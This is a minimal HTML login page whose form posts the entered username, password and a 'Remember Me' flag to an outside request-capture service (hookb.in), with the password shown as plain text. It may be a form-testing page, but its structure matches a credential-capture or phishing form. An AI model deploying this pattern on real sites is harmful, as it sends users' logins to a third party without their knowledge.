<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="css/darken.css" type="text/css" media="screen" charset="utf-8">
</head>
<body style="text-align: center;">
    <form action="https://hookb.in/Zm8dQMQn" method="post" target="_blank">
        <fieldset style="width: 400px; margin: auto;">
            <legend>Login</legend>
            <label for="user">Username</label>
            <input id="user" type="text" name="user" required>
            <label for="pass">Password</label>
            <input id="pass" type="text" name="pass" required>
            <label for="remember"><input id="remember" type="checkbox" name="remember" checked>Remember Me</label>
        </fieldset>
        
        <button>Login</button>
    </form>    
</body>
</html>
